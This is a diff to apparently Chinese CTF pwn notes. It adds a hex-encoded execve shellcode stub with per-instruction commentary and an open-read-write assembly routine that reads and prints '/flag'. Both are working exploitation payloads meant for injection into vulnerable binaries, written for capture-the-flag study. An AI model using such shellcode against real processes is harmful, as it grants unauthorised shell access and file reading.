@@ -171,6 +171,21 @@ for _ in range(42):
 
 ## orw普通的
 
+shellcode正常使用的
+
+```asm
+\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05
+
+0:  b0 3b                   mov    al, 0x3b    ; 将系统调用号 59 (0x3b) 放入 al 寄存器
+2:  5f                      pop    rdi         ; 将栈顶数据弹出至 rdi (作为第1个参数)
+3:  48 31 f6                xor    rsi, rsi    ; 将 rsi 清零 (作为第2个参数)
+6:  48 31 d2                xor    rdx, rdx    ; 将 rdx 清零 (作为第3个参数)
+9:  b0 3b                   mov    al, 0x3b    ; 再次将 59 (0x3b) 放入 al (稍微有点冗余)
+b:  0f 05                   syscall            ; 触发系统调用
+```
+
+
+
 /ctfshow_flag
 
 ```asm
@@ -210,6 +225,35 @@ for _ in range(42):
 ```
 
 /flag
+
+```asm
+		lea rsp, [rip+0x2000]
+
+        mov rax, 0x67616c662f 
+        push rax
+        mov rdi, rsp    
+        xor rsi, rsi    
+        xor rdx, rdx    
+        push 2
+        pop rax         
+        syscall
+
+        mov rdi, rax    
+        xor rax, rax    
+        mov rsi, rsp    
+        push 0x70
+        pop rdx         
+        syscall
+
+        mov rdx, rax
+        push 1
+        pop rdi     
+        push 1
+        pop rax     
+        syscall
+```
+
+
 
 ```asm
 		/* open(file='/flag', oflag=0, mode=0) */
